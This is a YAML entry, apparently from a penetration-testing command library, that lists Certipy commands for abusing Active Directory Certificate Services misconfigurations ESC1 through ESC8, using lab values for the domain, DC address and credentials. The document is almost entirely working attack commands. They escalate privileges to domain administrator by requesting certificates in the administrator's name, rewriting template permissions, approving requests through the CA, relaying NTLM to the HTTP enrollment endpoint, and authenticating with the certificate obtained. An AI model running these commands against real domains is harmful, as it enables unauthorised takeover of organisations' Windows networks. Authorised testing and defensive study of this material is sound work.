---
description: |
  Comprehensive ADCS exploitation — ESC1 through ESC8 using Certipy.
  Each ESC targets a different misconfiguration in certificate templates.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Find all vulnerable templates
  certipy find -u pentuser@test.local -p 'P@ssw0rd123' -dc-ip 10.10.10.1 -vulnerable -stdout

  # ESC1 — Enrollee supplies subject (request cert as admin)
  certipy req -u pentuser@test.local -p 'P@ssw0rd123' -dc-ip 10.10.10.1 -ca 'test-CA' -template 'VulnTemplate' -upn administrator@test.local

  # ESC2 — Any purpose EKU
  certipy req -u pentuser@test.local -p 'P@ssw0rd123' -dc-ip 10.10.10.1 -ca 'test-CA' -template 'VulnTemplate2'

  # ESC3 — Enrollment agent template
  certipy req -u pentuser@test.local -p 'P@ssw0rd123' -dc-ip 10.10.10.1 -ca 'test-CA' -template 'VulnTemplate3'
  certipy req -u pentuser@test.local -p 'P@ssw0rd123' -dc-ip 10.10.10.1 -ca 'test-CA' -template User -on-behalf-of 'test\administrator' -pfx pentuser.pfx

  # ESC4 — Vulnerable template ACL (modify template)
  certipy template -u pentuser@test.local -p 'P@ssw0rd123' -dc-ip 10.10.10.1 -template 'VulnTemplate4' -save-old

  # ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
  certipy req -u pentuser@test.local -p 'P@ssw0rd123' -dc-ip 10.10.10.1 -ca 'test-CA' -template User -upn administrator@test.local

  # ESC7 — Vulnerable CA ACL (ManageCA + ManageCertificates)
  certipy ca -ca 'test-CA' -add-officer pentuser -u pentuser@test.local -p 'P@ssw0rd123'
  certipy req -u pentuser@test.local -p 'P@ssw0rd123' -ca 'test-CA' -template SubCA -upn administrator@test.local
  certipy ca -ca 'test-CA' -issue-request REQUEST_ID -u pentuser@test.local -p 'P@ssw0rd123'
  certipy req -u pentuser@test.local -p 'P@ssw0rd123' -ca 'test-CA' -retrieve REQUEST_ID

  # ESC8 — NTLM relay to HTTP enrollment
  certipy relay -ca ca.test.local -template DomainController

  # Authenticate with any obtained certificate
  certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
phase:
  - Enumeration
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
  - HTTP
items:
  - Username
  - Password
  - Certificate
techniques:
  - ADCS_Abuse
network_position:
  - Internal
references:
  - https://github.com/ly4k/Certipy
  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
---
